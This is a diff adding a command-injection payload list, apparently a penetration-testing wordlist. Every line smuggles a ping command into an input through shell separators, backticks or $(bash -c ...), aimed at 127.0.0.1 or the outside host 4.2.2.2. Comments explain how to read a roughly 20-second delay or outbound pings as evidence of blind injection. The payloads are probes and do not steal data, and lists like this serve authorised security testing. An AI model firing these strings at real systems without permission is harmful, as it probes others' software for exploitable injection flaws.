@@ -1,0 +1,54 @@
+# If you inject this command and the system takes about 20 seconds to return, 
+# then you probably have a command injection. 
+|ping -c 21 127.0.0.1||`ping -c 21 127.0.0.1` #&apos; |ping -c 21 127.0.0.1||`ping -c 21 127.0.0.1` 
+|ping -c 21 127.0.0.1
+|`ping -c 21 127.0.0.1` 
+||`ping -c 21 127.0.0.1` 
+#\&quot; |ping -c 21 127.0.0.1
+#&apos; |ping -c 21 127.0.0.1
+&ping -c 21 127.0.0.1
+&&ping -c 21 127.0.0.1
+&`ping -c 21 127.0.0.1` 
+&&`ping -c 21 127.0.0.1` 
+`ping -c 21 127.0.0.1` 
+;`ping -c 21 127.0.0.1` 
+;ping -c 21 127.0.0.1
+$(bash -c "ping -c 21 127.0.0.1";exit)
+'`ping -c 21 127.0.0.1`'
+
+# If you inject these commands and the system takes about 20 seconds to respond OR 
+# you see a ping message leaving the system, then you probably have a command injection
+|ping -c 21 4.2.2.2||`ping -c 21 4.2.2.2` #&apos; |ping -c 21 4.2.2.2||`ping -c 21 4.2.2.2` 
+|ping -c 21 4.2.2.2
+|`ping -c 21 4.2.2.2` 
+||`ping -c 21 4.2.2.2` 
+#\&quot; |ping -c 21 4.2.2.2
+#&apos; |ping -c 21 4.2.2.2
+&ping -c 21 4.2.2.2
+&&ping -c 21 4.2.2.2
+&`ping -c 21 4.2.2.2` 
+&&`ping -c 21 4.2.2.2` 
+`ping -c 21 4.2.2.2` 
+;`ping -c 21 4.2.2.2` 
+;ping -c 21 4.2.2.2
+$(bash -c "ping -c 21 4.2.2.2";exit)
+'`ping -c 21 4.2.2.2`'
+
+# If you inject these commands and you see a ping message leaving the system, 
+# then you probably have a command injection. Not all embedded system recognize the 
+# -c option, so this removes it to allow the command to run.
+|ping 21 4.2.2.2||`ping 21 4.2.2.2` #&apos; |ping 21 4.2.2.2||`ping 21 4.2.2.2` 
+|ping 21 4.2.2.2
+|`ping 21 4.2.2.2` 
+||`ping 21 4.2.2.2` 
+#\&quot; |ping 21 4.2.2.2
+#&apos; |ping 21 4.2.2.2
+&ping 21 4.2.2.2
+&&ping 21 4.2.2.2
+&`ping 21 4.2.2.2` 
+&&`ping 21 4.2.2.2` 
+`ping 21 4.2.2.2` 
+;`ping 21 4.2.2.2` 
+;ping 21 4.2.2.2
+$(bash "ping 21 4.2.2.2";exit)
+'`ping 21 4.2.2.2`'
